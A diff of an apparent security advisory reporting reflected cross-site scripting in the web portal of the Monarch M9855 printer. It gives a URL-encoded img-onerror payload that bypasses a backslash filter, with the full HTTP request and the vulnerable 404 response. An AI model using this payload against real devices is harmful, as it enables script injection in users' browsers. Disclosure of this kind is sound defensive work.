@@ -1,24 +1,17 @@
-Reflected XSS (Cross-Site Scripting) attack
--------------------------------------------
+We have observed that the remote web app does not allow the "\" character. Also, the space character should be URL encoded. Therefore, we crafted a URL encoded XSS payload that doesn't contain the "\" character. Then, we have successfully performed XSS.
 
-Vendor: Avery Dennison
+IP: 
+10.22.41.20
 
+Software Info:
+Vendor: Monarch Dennison AVERY DENISSON
 Print Model: Monarch M9855
-
-Type: Unauthenticated Remote attack
-
-We have identified that the web portal of "Monarch M9855" printer device product is vulnerable to Reflective Cross-Site Scripting (XSS). This is due to that the Web App fails to adequately sanitize malicious strings. By leveraging this issue, an attacker is able to cause arbitrary HTML and JavaScript code to be executed in a user's browser within the security context of the affected site. This attack can be used in conjunction with a social engineering techniques.
-
-We have managed to bypass the server-side protection since the back-end does not allow the "\" character. Also, the Space character should be URL encoded. Therefore, we crafted a URL encoded payload that didn't contain the "\" character. 
-
-
-
-Below, evidence is provided.
+MonarchNet2 Network Interface
 
 
 Request:
 GET /%3Cimg%20src%3Dx%20onerror%3Dalert%28%22XSSbyIthacaLabs%22%29%3E HTTP/1.1
-Host: 1.1.1.1
+Host: 10.22.41.20
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
@@ -35,4 +28,4 @@ HTTP/1.0 200 Document follows
 Server: XCD WebAdmin
 Content-Type: text/html
 
-<html><h
+<html><head><title> ERROR 404</title></head><body><center> FILE  /<img src=x onerror=alert("XSSbyIthacaLabs")>  NOT FOUND, ERROR 404</center></body></html>
